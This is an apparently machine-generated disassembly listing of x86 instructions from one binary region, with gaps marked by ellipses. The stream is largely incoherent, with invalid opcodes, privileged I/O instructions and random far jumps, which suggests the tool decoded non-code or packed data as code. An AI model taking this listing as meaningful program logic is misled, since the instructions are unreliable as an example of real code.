  418844:	add    edx,DWORD PTR [ebx+0x6c2ac789]
  41884a:	dec    edi
  41884b:	call   0x8a6b:0x7dae5a31
  418852:	and    eax,0x2b08a95a
  418857:	jecxz  0x418824
  418859:	scas   eax,DWORD PTR es:[edi]
  41885a:	xlat   BYTE PTR ds:[ebx]
  41885b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41885c:	mov    DWORD PTR [ecx+ebx*4-0x1d536a79],esp
  418863:	cmp    DWORD PTR [eax+ecx*4],edi
  418866:	dec    edx
  418867:	mov    ebp,0x175fa5c
  41886c:	icebp  
	...
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi+0x249c3acd]
  4188e3:	pop    edi
  4188e4:	loope  0x418888
  4188e6:	or     BYTE PTR ss:[ecx],al
  4188e9:	add    bh,bh
  4188eb:	add    BYTE PTR [eax],al
  4188ed:	add    BYTE PTR [edx+ebp*4],ah
  4188f0:	clc    
  4188f1:	loop   0x4188e1
  4188f3:	sbb    al,0x93
  4188f5:	retf   
  4188f6:	retf   
  4188f7:	adc    eax,0xbe796a27
  4188fc:	sbb    edx,DWORD PTR [esi]
  4188fe:	and    DWORD PTR [ecx-0x49],edx
  418901:	int3   
  418902:	xchg   edi,eax
  418903:	xor    eax,0x2fa9ab7e
  418908:	and    eax,0x743ca3c0
  41890d:	pop    esp
  41890e:	or     esp,edi
  418910:	or     DWORD PTR ds:0x9a0945c0,edx
  418916:	mov    ah,0x49
  418918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418919:	inc    ecx
  41891a:	ret    
  41891b:	cmp    cl,BYTE PTR [esp+eax*1+0x4a]
  41891f:	dec    ecx
  418920:	mov    WORD PTR [edi],gs
  418922:	aad    0x44
  418924:	mov    edx,DWORD PTR fs:[ebx+edx*4+0x638b0465]
  41892c:	add    al,0x4c
  41892e:	push   edx
  41892f:	daa    
  418930:	mov    ebx,0x3776d361
  418935:	jb     0x41892b
  418937:	pop    ecx
  418938:	jle    0x418975
  41893a:	xchg   BYTE PTR [edi+0x27],dl
  41893d:	mov    BYTE PTR ds:0xce1545aa,dh
  418943:	stos   BYTE PTR es:[edi],al
  418944:	push   ebx
  418945:	add    esp,ebx
  418947:	cwde   
  418948:	xchg   edi,eax
  418949:	retf   
  41894a:	dec    ecx
  41894b:	popf   
  41894c:	fsubr  DWORD PTR [ebx+0x32c6c3f7]
  418952:	xchg   ecx,eax
  418953:	mov    ecx,0x19d13592
  418958:	push   edx
  418959:	pusha  
  41895a:	gs pop ecx
  41895c:	add    al,0x5
  41895e:	xchg   ebp,eax
  41895f:	add    al,0xe2
  418961:	cs ret 0xbbdc
  418965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418966:	pop    edx
  418967:	nop
  418968:	sti    
  418969:	iret   
  41896a:	sbb    esp,esi
  41896c:	loop   0x418945
  41896e:	jns    0x418946
  418970:	and    eax,0x366f8824
  418975:	dec    edx
  418976:	mov    bh,0x6
  418978:	mov    esp,0x5d3c8f10
  41897d:	ret    
  41897e:	lods   eax,DWORD PTR ds:[esi]
  41897f:	push   ecx
  418980:	popf   
  418981:	adc    bh,dl
  418983:	jl     0x41896f
  418985:	and    bl,BYTE PTR [ecx+eax*1-0x657b7a07]
  41898c:	enter  0x2474,0xdf
  418990:	test   al,0x59
  418992:	popa   
  418993:	mov    ds:0xa611cb76,al
  418998:	shl    esp,1
  41899a:	mov    esp,0xbb2c7f6c
  41899f:	push   ecx
  4189a0:	inc    ebp
  4189a1:	sub    BYTE PTR [esi+0x160a7e3f],al
  4189a7:	fidivr DWORD PTR [edx+0x5]
  4189aa:	adc    cl,cl
  4189ac:	jbe    0x4189c7
  4189ae:	inc    edi
  4189af:	push   ecx
  4189b0:	test   al,0x87
  4189b2:	fwait
  4189b3:	out    0x72,al
  4189b5:	lods   eax,DWORD PTR ds:[esi]
  4189b6:	addr16 pop esp
  4189b8:	aad    0x68
  4189ba:	and    edx,DWORD PTR [esi]
  4189bc:	inc    esp
  4189bd:	pop    ebx
  4189be:	test   DWORD PTR [ecx-0x3db86b7f],eax
  4189c4:	js     0x418a20
  4189c6:	loope  0x418a0d
  4189c8:	adc    esi,DWORD PTR [esi+0x4c]
  4189cb:	cmp    ebp,ebp
  4189cd:	imul   esi,DWORD PTR [ebx+0x5fa10450],0x71eed570
  4189d7:	call   DWORD PTR ds:0x4c4dcdbc
  4189dd:	mov    dl,0xd
  4189df:	mov    ebp,0x1a9b329b
  4189e4:	popa   
  4189e5:	pop    edx
  4189e6:	stos   BYTE PTR es:[edi],al
  4189e7:	jae    0x418a5d
  4189e9:	mov    ecx,0x370a34
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x89e76b69
  418a65:	xor    BYTE PTR ds:0xff000109,0x0
  418a6c:	add    BYTE PTR [eax],al
  418a6e:	popa   
  418a6f:	sbb    dl,BYTE PTR [eax+eiz*8-0x55]
  418a73:	fisubr DWORD PTR [edx]
  418a75:	cs out dx,al
  418a77:	or     BYTE PTR [esi+0x3320afa0],0x53
  418a7e:	add    DWORD PTR [ebx+0x61b66d3b],esp
  418a84:	mov    DWORD PTR [esi],esi
  418a86:	in     eax,0x94
  418a88:	and    ecx,DWORD PTR [edi+0x71]
  418a8b:	ins    DWORD PTR es:[edi],dx
  418a8c:	dec    esi
  418a8d:	sti    
  418a8e:	jle    0x418ac6
  418a90:	xchg   ebp,eax
  418a91:	retf   0x2c4c
  418a94:	cs jmp 0xd4d6:0x2b3532f
  418a9c:	jo     0x418a7d
  418a9e:	adc    al,BYTE PTR [ebx+0x3c]
  418aa1:	xor    al,0x12
  418aa3:	mov    eax,ds:0x7ecb3b6a
  418aa8:	or     eax,0x421a1cdc
  418aad:	out    0xa,eax
  418aaf:	es pop esi
  418ab1:	fcomp  DWORD PTR [edx+0x77324e09]
  418ab7:	ret    0xda5e
  418aba:	cmp    dh,BYTE PTR [ebp+edx*8+0x18ce2916]
  418ac1:	test   BYTE PTR [edi],0x1f
  418ac4:	mov    es,WORD PTR es:[eax-0x2b7da96e]
  418acb:	or     ebx,DWORD PTR ds:0x84b67c5e
  418ad1:	out    0xfa,al
  418ad3:	aad    0xef
  418ad5:	mov    dl,0x8d
  418ad7:	dec    edx
  418ad8:	cmp    al,0x61
  418ada:	inc    esi
  418adb:	jbe    0x418b29
  418add:	inc    ecx
  418ade:	pop    ebx
  418adf:	jmp    0x72df:0x405ac6a6
  418ae6:	(bad)  
  418ae7:	sbb    eax,esi
  418ae9:	loope  0x418b13
  418aeb:	retf   0x458f
  418aee:	jmp    0x418b5e
  418af0:	mov    DWORD PTR [edi],esi
  418af2:	clc    
  418af3:	jnp    0x418ad8
  418af5:	sbb    ah,ch
  418af7:	js     0x418ab9
  418af9:	xor    al,0x3a
  418afb:	dec    edi
  418afc:	and    edi,DWORD PTR [eax]
  418afe:	cmp    eax,0xdf64607d
  418b03:	jns    0x418b39
  418b05:	sbb    BYTE PTR [ecx+esi*1-0x40],ch
  418b09:	call   0xf4cc:0x44b40f07
  418b10:	cmp    BYTE PTR [eax+0x3726eb51],0xe1
  418b17:	(bad)  
  418b18:	jle    0x418a9a
  418b1a:	aaa    
  418b1b:	fidiv  WORD PTR [ecx-0x69]
  418b1e:	pop    ebx
  418b1f:	sbb    DWORD PTR [edi+0x498fc727],edi
  418b25:	imul   edi,DWORD PTR [ecx+ebp*2-0x671a1cfa],0xffffffb1
  418b2d:	ja     0x418abc
  418b2f:	sahf   
  418b30:	cld    
  418b31:	nop
  418b32:	cli    
  418b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b34:	ret    0xcfd1
  418b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b38:	push   ebp
  418b39:	push   cs
  418b3a:	xor    bh,BYTE PTR [esi+0x7402e931]
  418b40:	sti    
  418b41:	test   eax,0x9b087313
  418b46:	jmp    0xfed5235d
  418b4b:	mov    bh,0xe1
  418b4d:	(bad)  
  418b4e:	std    
  418b4f:	xchg   ecx,eax
  418b50:	(bad)  
  418b51:	std    
  418b52:	out    0xd5,eax
  418b54:	jg     0x418b97
  418b56:	popf   
  418b57:	sub    edi,DWORD PTR [ebp+0x4f]
  418b5a:	fst    QWORD PTR [ebx]
  418b5c:	out    dx,al
  418b5d:	add    al,0x19
  418b5f:	sub    al,BYTE PTR [ebp-0x48e6ad5f]
  418b65:	loope  0x418bac
  418b67:	ds lock pop ss
  418b6a:	pop    ebx
  418b6b:	push   cs
  418b6c:	repnz add BYTE PTR [eax],al
	...
  418bd3:	add    BYTE PTR [eax],al
  418bd5:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418bd9:	xor    ch,bh
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0xe7
  418be3:	inc    ebp
  418be4:	adc    eax,0x10a3432
  418be9:	add    bh,bh
  418beb:	add    BYTE PTR [eax],al
  418bed:	add    BYTE PTR [ebx+ebx*2+0x71],al
  418bf1:	scas   eax,DWORD PTR es:[edi]
  418bf2:	test   DWORD PTR [ebx-0x2c],eax
  418bf5:	xor    esi,ebx
  418bf7:	jmp    0x9d04:0x6e107528
  418bfe:	enter  0x4d9a,0xbf
  418c02:	xchg   ecx,eax
  418c03:	scas   eax,DWORD PTR es:[edi]
  418c04:	pushf  
  418c05:	xor    DWORD PTR [ecx],edi
  418c07:	jge    0x418bcd
  418c09:	stc    
  418c0a:	pop    ecx
  418c0b:	in     eax,dx
  418c0c:	daa    
  418c0d:	ds call 0x4285:0x84575178
  418c15:	in     al,dx
  418c16:	nop
  418c17:	and    al,0x57
  418c19:	out    dx,al
  418c1a:	mov    ecx,0x4ad8f335
  418c1f:	jae    0x418c70
  418c21:	stc    
  418c22:	xchg   DWORD PTR [edi-0x341054e7],esi
  418c28:	sub    ebp,DWORD PTR [ecx]
  418c2a:	retf   
  418c2b:	aas    
  418c2c:	stc    
  418c2d:	pushf  
  418c2e:	repz test DWORD PTR [ebp-0x374c3840],ecx
  418c35:	in     eax,0x2d
  418c37:	add    DWORD PTR [edx],eax
  418c39:	ss jmp 0x34c33900
  418c3f:	mov    bl,0xaa
  418c41:	mul    BYTE PTR [ebp-0x49661e7d]
  418c47:	pop    esi
  418c48:	mov    bh,0xa9
  418c4a:	jne    0x418cc5
  418c4c:	sub    bl,BYTE PTR [esi]
  418c4e:	pop    esp
  418c4f:	inc    esp
  418c50:	ror    DWORD PTR [esi-0x4bc490d7],0x9
  418c57:	nop
  418c58:	fimul  WORD PTR [ecx]
  418c5a:	mov    dl,BYTE PTR [ebp+0x7dc4f8d6]
  418c60:	sbb    DWORD PTR [edx+0x26],0xffffffc2
  418c64:	jno    0x418bf6
  418c66:	jp     0x418c8b
  418c68:	es push 0x72438175
  418c6e:	stc    
  418c6f:	mov    BYTE PTR [ecx],ah
  418c71:	xor    cl,dh
  418c73:	in     eax,0xd1
  418c75:	and    eax,edx
  418c77:	sub    eax,0x44a94ab
  418c7c:	mov    ds:0x89013c07,eax
  418c81:	cli    
  418c82:	mov    gs,WORD PTR [ebp+0x33f2c3ed]
  418c88:	loopne 0x418cdc
  418c8a:	xor    eax,eax
  418c8c:	inc    ecx
  418c8d:	test   eax,0xb334a4f2
  418c92:	cld    
  418c93:	and    BYTE PTR [esi+ecx*2-0x7a7a0e33],cl
  418c9a:	lds    eax,FWORD PTR [edx-0x67]
  418c9d:	fldcw  WORD PTR [ebp+ecx*2-0x4f]
  418ca1:	fcomip st,st(2)
  418ca3:	ret    0x3ed4
  418ca6:	mov    ecx,0x1bbddbd6
  418cab:	leave  
  418cac:	jp     0x418cee
  418cae:	push   cs
  418caf:	fdiv   st,st(7)
  418cb1:	jp     0x418d2a
  418cb3:	lods   eax,DWORD PTR ss:[esi]
  418cb5:	mov    WORD PTR [eax+ebp*2+0x785d9d10],fs
  418cbc:	ins    BYTE PTR es:[edi],dx
  418cbd:	data16 div dh
  418cc0:	out    dx,eax
  418cc1:	pop    ebp
  418cc2:	and    DWORD PTR [ecx],edx
  418cc4:	inc    ebp
  418cc5:	or     bh,bh
  418cc7:	fucomi st,st(5)
  418cc9:	sub    eax,0x642299f5
  418cce:	aam    0xfb
  418cd0:	das    
  418cd1:	aas    
  418cd2:	xor    bh,dh
  418cd4:	es xchg edx,eax
  418cd6:	inc    ebp
  418cd7:	push   0x2d
  418cd9:	iret   
  418cda:	jae    0x418c70
  418cdc:	mov    ds:0xd2191232,al
  418ce1:	cli    
  418ce2:	sub    al,0x78
  418ce4:	shl    DWORD PTR [esi-0x4b281057],cl
  418cea:	inc    esi
  418ceb:	xchg   cx,ax
	...
  418d55:	add    bl,bh
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rol    dh,cl
  418d63:	push   ebx
  418d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d65:	arpl   WORD PTR [ebx],si
  418d67:	or     eax,DWORD PTR [ecx]
  418d69:	add    bh,bh
  418d6b:	add    BYTE PTR [eax],al
  418d6d:	add    ch,dl
  418d6f:	test   BYTE PTR [ebx-0xae4825f],ch
  418d75:	pop    eax
  418d76:	cwde   
  418d77:	pushf  
  418d78:	test   BYTE PTR [edx],0x7c
  418d7b:	ins    BYTE PTR es:[edi],dx
  418d7c:	stos   DWORD PTR es:[edi],eax
  418d7d:	adc    DWORD PTR [ecx-0x2c],edx
  418d80:	mov    ecx,eax
  418d82:	mov    ds,ecx
  418d84:	in     al,0xed
  418d86:	add    DWORD PTR [ebx],edx
  418d88:	popw   es
  418d8a:	add    al,0x4b
  418d8c:	dec    edx
  418d8d:	mov    esi,0x396aad66
  418d92:	jle    0x418db2
  418d94:	jns    0x418e14
  418d96:	stos   DWORD PTR es:[edi],eax
  418d97:	mov    ah,0x70
  418d99:	mov    ah,0x79
  418d9b:	cld    
  418d9c:	das    
  418d9d:	xor    al,0x51
  418d9f:	loopne 0x418d2c
  418da1:	ret    
  418da2:	dec    eax
  418da3:	rcl    DWORD PTR [ebx+0x34],cl
  418da6:	ficomp WORD PTR [eax]
  418da8:	das    
  418da9:	push   eax
  418daa:	xchg   ecx,eax
  418dab:	cld    
  418dac:	(bad)  
  418dad:	aas    
  418dae:	or     DWORD PTR [edx+edx*4],esi
  418db1:	xchg   ecx,ebx
  418db3:	fwait
  418db4:	shl    BYTE PTR [edx+0x9],cl
  418db7:	into   
  418db8:	add    dh,BYTE PTR [ecx-0x5672502b]
  418dbe:	xor    bh,BYTE PTR [bp+si+0x3188]
  418dc3:	inc    eax
  418dc4:	push   ds
  418dc5:	ret    0xa003
  418dc8:	aad    0x3f
  418dca:	mov    ebp,0xe3f917a9
  418dcf:	mov    es,WORD PTR [edi+0x60]
  418dd2:	sti    
  418dd3:	xchg   ebp,eax
  418dd4:	(bad)  
  418dd5:	aad    0xa5
  418dd7:	mov    cl,BYTE PTR [ecx]
  418dd9:	enter  0xf026,0x41
  418ddd:	mov    edi,0x4495d018
  418de2:	inc    ebp
  418de3:	ret    
  418de4:	fld    TBYTE PTR [ecx+0x56a3a2d0]
  418dea:	sbb    ecx,DWORD PTR [ecx+0x60]
  418ded:	push   ebp
  418dee:	fidiv  WORD PTR [eax-0x437e951d]
  418df4:	xor    BYTE PTR [esi-0x75],0x2e
  418df8:	mov    ebx,0xb82de75c
  418dfd:	push   edi
  418dfe:	sahf   
  418dff:	adc    DWORD PTR [esp+esi*4-0x4c3f96ea],ebp
  418e06:	std    
  418e07:	xchg   esi,eax
  418e08:	stos   DWORD PTR es:[edi],eax
  418e09:	ds dec ebp
  418e0b:	jg     0x418de3
  418e0d:	or     BYTE PTR [edx+0x76bd316c],al
  418e13:	int    0x40
  418e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e16:	loopne 0x418e35
  418e18:	push   cs
  418e19:	sahf   
  418e1a:	push   ss
  418e1b:	inc    ecx
  418e1c:	les    ebx,FWORD PTR [edx]
  418e1e:	retf   
  418e1f:	add    ch,BYTE PTR [eax+0x34849e9]
  418e25:	imul   BYTE PTR [ebx-0xd14d64f]
  418e2b:	retf   0xab8e
  418e2e:	iret   
  418e2f:	xchg   ecx,eax
  418e30:	or     dl,dl
  418e32:	dec    ebp
  418e34:	test   eax,0x18307ec9
  418e39:	int    0x3
  418e3b:	scas   eax,DWORD PTR es:[edi]
  418e3c:	mov    WORD PTR [ebx+0x4d],ss
  418e3f:	mov    gs,WORD PTR [esi-0x6af18f2a]
  418e45:	fld    DWORD PTR [esi+0x609d8fc7]
  418e4b:	xor    DWORD PTR [eax],esi
  418e4d:	inc    edi
  418e4e:	fs jl  0x418e50
  418e51:	fnstenv [ebx+0x3]
  418e54:	sub    DWORD PTR [esi+0x12a1742],0xffffffe9
  418e5b:	ja     0x418ed7
  418e5d:	push   edi
  418e5e:	addr16 ret 0x2fa6
  418e62:	addr16 xchg ebx,eax
  418e64:	mov    ?,WORD PTR [esi]
  418e66:	loope  0x418e4f
  418e68:	in     eax,dx
  418e69:	xchg   BYTE PTR [ecx-0x7],cl
  418e6c:	mov    esi,0x0
	...
  418ed5:	add    BYTE PTR [esi],cl
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx-0x59]
  418ee3:	arpl   WORD PTR [ebp-0x30],sp
  418ee6:	xor    cl,BYTE PTR [ecx+eax*1]
  418ee9:	add    bh,bh
  418eeb:	add    BYTE PTR [eax],al
  418eed:	add    ah,al
  418eef:	add    ah,BYTE PTR [ebx-0x233d3ac8]
  418ef5:	and    cl,ah
  418ef7:	and    DWORD PTR [ebx+0x15c66e11],ebp
  418efd:	fistp  QWORD PTR [edx+ebx*2]
  418f00:	mov    ds:0x93c7e469,eax
  418f05:	push   edi
  418f06:	rcr    BYTE PTR [edi+0x7648a4a2],1
  418f0c:	and    ah,BYTE PTR [bx+di+0x435b]
  418f11:	je     0x418f8d
  418f13:	or     eax,DWORD PTR [esi]
  418f15:	push   0xfffffffc
  418f17:	out    0xe9,al
  418f19:	mov    bh,0x92
  418f1b:	shr    BYTE PTR [esi+0x357cf41b],1
  418f21:	or     DWORD PTR [edi+0x7d],0x78
  418f25:	adc    eax,0xe1f2f793
  418f2a:	jmp    0x2fc68b9c
  418f2f:	dec    ebp
  418f30:	xchg   edi,eax
  418f31:	(bad)  
  418f32:	std    
  418f33:	push   eax
  418f34:	test   eax,0x744ff49d
  418f39:	or     cl,dl
  418f3b:	test   BYTE PTR [ecx],bl
  418f3d:	ds ror ecx,cl
  418f40:	mov    BYTE PTR [eax-0x1eb8758c],bl
  418f46:	add    edx,DWORD PTR [ecx+0x25]
  418f49:	call   0xb77d:0xdefbdb5c
  418f50:	idiv   ecx
  418f52:	jb     0x418f6d
  418f54:	cmp    DWORD PTR [edx+0x32b0f577],esi
  418f5a:	bound  esi,QWORD PTR [edx-0x72]
  418f5d:	pop    es
  418f5e:	pop    ebx
  418f5f:	aam    0x6a
  418f61:	push   esp
  418f62:	repz mov dl,0xa8
  418f65:	into   
  418f66:	mov    esi,0x7cd2e6e2
  418f6b:	inc    edi
  418f6c:	jg     0x418f2c
  418f6e:	xlat   BYTE PTR ds:[ebx]
  418f6f:	in     eax,0x1d
  418f71:	(bad)
  418f74:	sahf   
  418f75:	cmc    
  418f76:	mov    cl,0xd
  418f78:	iret   
  418f79:	push   0x22961c39
  418f7e:	fistp  DWORD PTR [ebp+eax*4+0x5dffbd]
  418f85:	fwait
  418f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f87:	push   esp
  418f88:	cwde   
  418f89:	mov    ds:0xccf8e0e3,eax
  418f8e:	mov    ah,0x67
  418f90:	cld    
  418f91:	mov    edi,0x279a6431
  418f96:	jmp    0x418f7e
  418f98:	mov    ah,BYTE PTR [eax+eax*4-0x1]
  418f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f9d:	push   edx
  418f9e:	les    edi,FWORD PTR [ebx-0x54ae1d15]
  418fa4:	fndisi(8087 only) 
  418fa6:	ret    0x171f
  418fa9:	add    bh,BYTE PTR ds:0xac9ea535
  418faf:	inc    esp
  418fb0:	mov    eax,ds:0xee9bcef3
  418fb5:	rol    DWORD PTR [esi+0x77],0x5b
  418fb9:	inc    eax
  418fba:	adc    edx,DWORD PTR [edx]
  418fbc:	mov    dl,0xd
  418fbe:	push   eax
  418fbf:	jno    0x418f77
  418fc1:	xchg   ebp,eax
  418fc2:	stos   DWORD PTR es:[edi],eax
  418fc3:	lds    edi,FWORD PTR [eax+0x38]
  418fc6:	sbb    al,0x66
  418fc8:	mov    bl,0x54
  418fca:	sub    dl,cl
  418fcc:	cmp    al,0x79
  418fce:	add    al,0x9a
  418fd0:	jb     0x418ff9
  418fd2:	fisubr DWORD PTR [ebx-0x5e]
  418fd5:	rcr    bh,0xaf
  418fd8:	(bad)  
  418fd9:	loope  0x419046
  418fdb:	mov    ebp,0xf7cda1f7
  418fe0:	xchg   esi,eax
  418fe1:	call   0x90d873e0
  418fe6:	loope  0x418ff8
  418fe8:	into   
  418fe9:	test   BYTE PTR [ecx+0x5717],0x0
	...
  419054:	add    BYTE PTR [eax],al
  419056:	sbb    al,0x97
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx+0x3beaf1a7]
  419063:	and    edi,DWORD PTR [ebx-0x19]
  419066:	xor    DWORD PTR ds:0xff0001,ecx
  41906c:	add    BYTE PTR [eax],al
  41906e:	xchg   cl,dh
  419070:	lods   al,BYTE PTR ds:[esi]
  419071:	fild   QWORD PTR [esi-0x2e09658f]
  419077:	sub    dh,BYTE PTR [edi-0xdac3d38]
  41907d:	ret    0x8fdd
  419080:	or     DWORD PTR ds:0xe961c932,eax
  419086:	loopne 0x4190aa
  419088:	mov    esp,0x8f5421a1
  41908d:	std    
  41908e:	ret    
  41908f:	addr16 add ecx,0x5caaf6a0
  419096:	xor    cl,dh
  419098:	pushw  ss
  41909a:	pushf  
  41909b:	adc    ah,BYTE PTR [edx+esi*8]
  41909e:	mov    DWORD PTR [edi],ebp
  4190a0:	mov    DWORD PTR [ebp+eiz*2+0x12],eax
  4190a4:	rcl    DWORD PTR [ecx],1
  4190a6:	outs   dx,BYTE PTR ds:[esi]
  4190a7:	jno    0x41904f
  4190a9:	hlt    
  4190aa:	loop   0x419035
  4190ac:	and    bl,cl
  4190ae:	sub    eax,0x95ca0df0
  4190b3:	jo     0x419093
  4190b5:	lea    ebp,[edi*2-0x21f7b53a]
  4190bc:	push   eax
  4190bd:	bound  esi,QWORD PTR [ebp-0x51]
  4190c0:	mov    eax,ds:0x940ffcec
  4190c5:	mov    es,WORD PTR [edx+0x2c76c930]
  4190cb:	test   eax,0xf796ba7
  4190d0:	or     al,0xfe
  4190d2:	jg     0x419088
  4190d4:	cmp    al,0xf9
  4190d6:	mov    WORD PTR [edi-0x17e18896],fs
  4190dc:	mov    ah,0x72
  4190de:	push   0x55
  4190e0:	(bad)  
  4190e2:	pop    es
  4190e3:	rcl    dh,0xe2
  4190e6:	sub    edi,DWORD PTR [eax+0x39]
  4190e9:	pop    edi
  4190ea:	xor    ebx,DWORD PTR [edi]
  4190ec:	xchg   edx,eax
  4190ed:	imul   ebp,DWORD PTR [ecx+0x23],0xcd71c0c4
  4190f4:	sahf   
  4190f5:	ins    BYTE PTR es:[edi],dx
  4190f6:	dec    ecx
  4190f7:	adc    bh,ch
  4190f9:	jp     0x419152
  4190fb:	sahf   
  4190fc:	call   0xa499:0x464bddca
  419103:	inc    ebx
  419104:	ret    0x59a1
  419107:	fcmovbe st,st(1)
  419109:	mov    dl,BYTE PTR [ebp-0x43]
  41910c:	repnz std 
  41910e:	xor    dl,dl
  419110:	cli    
  419111:	cli    
  419112:	not    DWORD PTR [edi]
  419114:	adc    al,0x94
  419116:	dec    ebx
  419117:	mov    dl,bl
  419119:	jmp    0xeb8a:0x719c9bf4
  419120:	pop    esp
  419121:	cmp    DWORD PTR [ebp-0x40],edi
  419124:	or     al,0xff
  419126:	iret   
  419127:	mov    dh,0xc1
  419129:	push   ss
  41912a:	inc    edi
  41912b:	mov    eax,ds:0xf94014c0
  419130:	jmp    0xd4b2:0x2858872a
  419137:	rol    edi,cl
  419139:	into   
  41913a:	enter  0x699e,0x8d
  41913e:	xor    ah,BYTE PTR [edx]
  419140:	sbb    bl,cl
  419142:	and    eax,0xe8a2402b
  419147:	cmc    
  419148:	dec    edi
  419149:	fimul  WORD PTR [edi-0x5520c88]
  41914f:	mov    ebp,0x2b8808c0
  419154:	push   es
  419155:	adc    DWORD PTR [ecx-0x261b2dfb],ebp
  41915b:	cmp    cl,BYTE PTR ds:0x7677eaf9
  419161:	daa    
  419162:	test   ebx,eax
  419164:	out    0x2a,eax
  419166:	int    0xd6
  419168:	imul   ecx,DWORD PTR [edx+0x771377],0x0
	...
  4191d3:	add    BYTE PTR [eax],al
  4191d5:	add    BYTE PTR [edi-0x41bd617b],ch
  4191db:	pop    ebx
  4191dc:	(bad)  
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     ch,BYTE PTR [ecx-0x6e]
  4191e4:	popa   
  4191e5:	xchg   ebp,eax
  4191e6:	xor    BYTE PTR [esi],cl
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	inc    DWORD PTR [eax]
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	stc    
  4191ef:	out    dx,eax
  4191f0:	lea    ebx,[edx+0x3e84e2e3]
  4191f6:	addr16 cmp eax,0x2ac7f26a
  4191fc:	lods   al,BYTE PTR ds:[esi]
  4191fd:	enter  0xbe8b,0xe
  419201:	imul   edi,ebp,0xf58deee1
  419207:	sbb    DWORD PTR [ebx+0x79],0xffffffa2
  41920b:	mov    al,0x49
  41920d:	inc    BYTE PTR [edx+edi*4+0x72]
  419211:	test   DWORD PTR [eax+0x11a39068],eax
  419217:	and    edi,eax
  419219:	push   ebp
  41921a:	inc    eax
  41921b:	retf   
  41921c:	pop    edx
  41921d:	imul   ecx,DWORD PTR [ebx+0x183068f4],0xffffffb6
  419224:	dec    eax
  419225:	adc    BYTE PTR [esi+0x57755136],bh
  41922b:	mov    bh,0x48
  41922d:	test   BYTE PTR [ebx+edi*4-0x1d9dbeed],bh
  419234:	lea    ecx,[ebp-0x7]
  419237:	inc    ebx
  419238:	outs   dx,BYTE PTR ds:[esi]
  419239:	cwde   
  41923a:	sub    BYTE PTR [ecx+eiz*2-0x19],dh
  41923e:	mov    ds:0x6a332868,eax
  419243:	mov    bl,0x1c
  419245:	add    dl,bl
  419247:	inc    ebx
  419248:	inc    esp
  419249:	and    al,0xfd
  41924b:	pushf  
  41924c:	add    al,0x4b
  41924e:	cmp    eax,0x528f8d07
  419253:	outs   dx,DWORD PTR ds:[esi]
  419254:	xor    bh,BYTE PTR [eax-0x2]
  419257:	ja     0x419239
  419259:	jl     0x419222
  41925b:	jo     0x419211
  41925d:	mov    bl,BYTE PTR [ebp-0x40]
  419260:	test   eax,0xb0fb7e70
  419265:	pop    es
  419266:	mov    bl,BYTE PTR [edx]
  419268:	push   ecx
  419269:	mov    eax,ds:0x49e9dd2b
  41926e:	icebp  
  41926f:	jne    0x419299
  419271:	xor    DWORD PTR [edi-0xb71c4bb],0x8
  419278:	data16 or al,0x7b
  41927b:	mov    esp,0x3ab5eea6
  419280:	mov    ch,0x68
  419282:	and    al,0x73
  419284:	inc    esp
  419285:	pop    ss
  419286:	cdq    
  419287:	bound  ebp,QWORD PTR [edi+0x3af4f4f]
  41928d:	and    DWORD PTR [eax-0x4bdafe26],eax
  419293:	fs aam 0x6c
  419296:	mov    esp,0xf6e7b316
  41929b:	neg    esp
  41929d:	xor    ch,BYTE PTR [edx+0x1a68f51f]
  4192a3:	fimul  DWORD PTR [esi+0x1d383b24]
  4192a9:	jmp    0x419281
  4192ab:	cmp    BYTE PTR [esi+0x42],0x68
  4192af:	inc    ebx
  4192b0:	dec    eax
  4192b1:	dec    edx
  4192b2:	and    edx,edi
  4192b4:	mov    bl,BYTE PTR [ebp+0x16]
  4192b7:	pop    es
  4192b8:	jo     0x419338
  4192ba:	xor    al,0x1f
  4192bc:	nop
  4192bd:	sbb    al,0x95
  4192bf:	stos   BYTE PTR es:[edi],al
  4192c0:	shl    BYTE PTR [ecx+edx*4+0x693f96f7],0xac
  4192c8:	mov    esp,0xf701a60a
  4192cd:	xchg   esp,eax
  4192ce:	call   0x557cd5f8
  4192d3:	jns    0x4192d2
  4192d5:	mov    ch,BYTE PTR [eax]
  4192d7:	dec    ebx
  4192d8:	rcr    BYTE PTR [edi+ebp*4],1
  4192db:	shl    DWORD PTR [edi+0x4],0x8e
  4192df:	adc    BYTE PTR [ecx-0x80],bl
  4192e2:	adc    eax,0x41925cc8
  4192e7:	rep ins BYTE PTR es:[edi],dx
  4192e9:	sub    ebx,DWORD PTR [eax+0xb75b]
	...
  419353:	add    BYTE PTR [eax],al
  419355:	add    BYTE PTR [eax-0xcc4519],ah
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	cli    
  419363:	xchg   ecx,eax
  419364:	dec    edi
  419365:	aaa    
  419366:	das    
  419367:	sgdtd  [eax]
  41936a:	inc    DWORD PTR [eax]
  41936c:	add    BYTE PTR [eax],al
